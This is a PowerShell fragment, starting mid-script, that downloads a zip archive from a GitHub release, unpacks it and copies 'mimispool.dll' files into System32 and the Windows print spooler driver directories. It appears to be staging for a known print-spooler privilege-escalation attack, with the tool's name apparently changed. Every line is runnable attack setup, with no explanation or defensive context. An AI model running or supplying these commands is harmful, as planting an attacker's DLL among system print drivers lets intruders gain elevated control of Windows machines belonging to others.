...
Invoke-WebRequest -Uri 'https://github.com/gentilkiwi/wangfly/releases/latest/download/wangfly_trunk.zip' -OutFile '.\wangfly_trunk.zip'
Expand-Archive -Path '.\wangfly_trunk.zip' -DestinationPath '.\wangfly_trunk'

Copy-Item -Force -Path ($system32 + '\mscms.dll')             -Destination ($system32 + '\mimispool.dll')
Copy-Item -Force -Path '.\wangfly_trunk\x64\mimispool.dll'   -Destination ($drivers  + '\x64\3\mimispool.dll')
Copy-Item -Force -Path '.\wangfly_trunk\win32\mimispool.dll' -Destination ($drivers  + '\W32X86\3\mimispool.dll')
